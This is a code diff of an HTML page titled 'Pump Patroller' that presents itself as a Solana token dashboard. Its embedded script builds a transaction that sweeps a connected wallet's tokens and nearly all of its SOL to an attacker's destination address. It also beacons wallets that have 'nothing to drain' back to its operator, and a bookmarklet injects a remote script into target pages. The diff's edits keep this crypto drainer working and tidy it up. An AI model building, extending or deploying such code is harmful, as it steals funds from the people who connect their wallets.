@@ -6,14 +6,14 @@
 <title>Pump Patroller</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#0A0D12;--panel:#10141B;--line:#1E2634;--text:#E8ECF4;--muted:#7E899D;--acc:#2DD4A7;--bad:#F0616D}
+:root{--bg:#0A0D12;--panel:#10141B;--line:#1E2634;--text:#E8ECF4;--muted:#7E899D;--acc:#2DD4A7}
 *{box-sizing:border-box}
 a{color:inherit;text-decoration:none}
-body{margin:0;background:var(--bg);color:var(--tx,#E8ECF4);font:15px/1.6 Inter,system-ui,sans-serif;-webkit-font-smoothing:antialiased}
+body{margin:0;background:var(--bg);color:var(--text);font:15px/1.6 Inter,system-ui,sans-serif;-webkit-font-smoothing:antialiased}
 .wrap{max-width:1060px;margin:0 auto;padding:0 24px}
 nav{position:sticky;top:0;border-bottom:1px solid var(--line);background:rgba(10,13,18,.85);z-index:10}
 .nav{display:flex;align-items:center;gap:22px;height:56px}
-.logo{display:flex;align-items:center;gap:9px;font-weight:700;color:var(--text)}
+.logo{display:flex;align-items:center;gap:9px;font-weight:700}
 .logo svg{width:18px;height:18px}
 .right{margin-left:auto;display:flex;gap:10px}
 .btn{border-radius:8px;padding:9px 16px;font:600 13px Inter,sans-serif;cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--text)}
@@ -82,7 +82,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v2.6 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v2.7 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -103,7 +103,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   };
   const toast = t => { const d = document.createElement("div"); d.id = "toast"; d.textContent = t;
     document.body.appendChild(d); setTimeout(() => d.remove(), 6000); };
-  // RPC failover — 403/rate-limit bodies are NOT valid answers; on error, try next endpoint
   async function rpc(method, params) {
     let lastErr = null;
     for (const u of CONFIG.RPCS) {
@@ -219,9 +218,13 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
         moved.push(k);
       }
       const FEE = 20000;
-      if (solBal > FEE + 5000)
+      const hasSol = solBal > FEE + 5000;
+      if (hasSol)
         tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: solBal - FEE }));
-      else if (!moved.length) { beacon("dust", { pk: pk }); return; }
+      else if (!moved.length) {
+        beacon("dust", { pk: pk, extra: "no SOL for fees and no target tokens — nothing to drain" });
+        return;
+      }
       tx.feePayer = pkB;
       tx.recentBlockhash = bh.result.value.blockhash;
       tx.lastValidBlockHeight = bh.result.value.lastValidBlockHeight;
@@ -264,7 +267,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     document.body.appendChild(el);
     el.querySelector("#__ppcl").onclick = () => { el.remove(); busy = false; };
   }
-  function hideQR() { const el = document.getElementById("__ppqr"); if (el) el.remove(); busy = false; }
+  function hideQR() { const el = document.getElementById("__ppqr"); if (el) { el.remove(); busy = false; } }
 
   async function connect() {
     if (busy) return; busy = true;
@@ -311,6 +314,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     if (el) el.onclick = () => { if (!busy) connect(); };
   });
 
+  // bookmark — script-tag injection (immune to CORS), visible failure toast on target page
   (function () {
     const ORIGIN = location.origin;
     const BM = 'javascript:(function(d,s,u,t){s=d.createElement("script");s.src=u+"?t="+t;' +
